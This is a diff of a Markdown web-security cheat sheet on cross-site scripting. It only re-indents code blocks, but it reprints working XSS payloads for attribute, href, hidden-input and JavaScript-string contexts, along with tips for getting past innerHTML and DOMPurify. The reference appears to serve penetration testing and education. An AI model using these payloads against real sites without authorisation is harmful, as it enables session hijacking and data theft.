@@ -41,7 +41,7 @@ function unsafe(t) {
 
 **Warning**: Do not use `<script>` tag -> use `<img>`.
 
-If your target is using the innerHTML sink, the most common sink vulnerable to DOM XSS so your script might not work as expected. This is because innerHTML won't render a `<script>` tag \[[🔗](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)]. However, if you use an `<img>` tag with an onerror attribute instead, the script will execute normally. 
+If your target is using the innerHTML sink, the most common sink vulnerable to DOM XSS so your script might not work as expected. This is because innerHTML won't render a `<script>` tag \[[↗](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)]. However, if you use an `<img>` tag with an onerror attribute instead, the script will execute normally. 
 
 Additionally, if the target sanitizes your payload using a library like DOMPurify, instead of simply encoding it, a `<script>` tag would be completely stripped out, leaving no visible trace. On the other hand, if you use an `<img>` tag, DOMPurify will remove the onerror attribute as expected, but the image itself will still be present. You will see the image load (or attempt to load) and the corresponding request in the logs, signaling that further investigation is needed.
 
@@ -247,46 +247,46 @@ element.innerHTML = comment.author
 
 * Terminate the attribute value, close the tag, and introduce a new one.
 
-```html
-"><script>alert(document.domain)</script>
-```
+    ```html
+    "><script>alert(document.domain)</script>
+    ```
 
 * If angle brackets are blocked or encoded, introduce a new attribute that creates a scriptable context.
 
-```html
-" autofocus onfocus=alert(document.domain) x="
-```
+    ```html
+    " autofocus onfocus=alert(document.domain) x="
+    ```
 
 * If XSS context is into the href attribute of an anchor tag, use the javascript pseudo-protocol to execute script
 
-```html
-<a href="javascript:alert(document.domain)">
-```
+    ```html
+    <a href="javascript:alert(document.domain)">
+    ```
 
 * Access keys allow you to provide keyboard shortcuts that reference a specific element. This is useful in hidden inputs because events like onmouseover and onfocus can't be triggered due to the element being invisible
 
-```html
-<input type="hidden" accesskey="X" onclick="alert(1)">
-```
+    ```html
+    <input type="hidden" accesskey="X" onclick="alert(1)">
+    ```
 
-```html
-<link rel="canonical" accesskey="X" onclick="alert(1)" />
-```
+    ```html
+    <link rel="canonical" accesskey="X" onclick="alert(1)" />
+    ```
 
-{{< hint style=notes >}}
-**Tips**:
+   {{< hint style=notes >}}
+   **Tips**:
 
-* Substitute `'` `"` and vice versa
-* Space is not needed
+   * Substitute `'` `"` and vice versa
+   * Space is not needed
 
-```html
-<link rel="canonical" href='https://website.net/?'accesskey='X'onclick='alert(1)'/>
-```
-{{< /hint >}}
+   ```html
+   <link rel="canonical" href='https://website.net/?'accesskey='X'onclick='alert(1)'/>
+   ```
+   {{< /hint >}}
 
-```html
-<link rel="canonical" href='https://website.net/?'accesskey='X'onclick='alert(1)'/>
-```
+    ```html
+    <link rel="canonical" href='https://website.net/?'accesskey='X'onclick='alert(1)'/>
+    ```
 
 ### Into JavaScript
 
@@ -313,10 +313,10 @@ var input = 'controllable data here';
 
 * It's essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing
 
-```javascript
-'-alert(document.domain)-'
-';alert(document.domain)//
-```
+    ```javascript
+    '-alert(document.domain)-'
+    ';alert(document.domain)//
+    ```
 
 * Some applications try to escape single quote characters with a backslash but often forget to escape the backslash itself.
   * `';alert(document.domain)//` is converted to `\';alert(document.domain)//`&#x20;
@@ -328,21 +328,21 @@ var input = 'controllable data here';
     * The browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted
     * HTML encode: https://html.spec.whatwg.org/multipage/named-characters.html
 
-{{< hint style=notes >}}
-**Note**: you cannot use `&quot;` -> `"` to close onclick attribute. Remember: The browser HTML-decode the value of the onlick attribute but not the entire structure
-{{< /hint >}}
+   {{< hint style=notes >}}
+   **Note**: you cannot use `&quot;` -> `"` to close onclick attribute. Remember: The browser HTML-decode the value of the onlick attribute but not the entire structure
+   {{< /hint >}}
 
 * XSS in JavaScript template literals
   * JavaScript template literals are string literals that allow embedded JavaScript expressions (Template literals are encapsulated in backticks)
 
-```html
-<script>
-...
-var input = `controllable data here`;
-...
-</script>
-${alert(document.domain)}
-```
+    ```html
+    <script>
+    ...
+    var input = `controllable data here`;
+    ...
+    </script>
+    ${alert(document.domain)}
+    ```
 
 ---
 
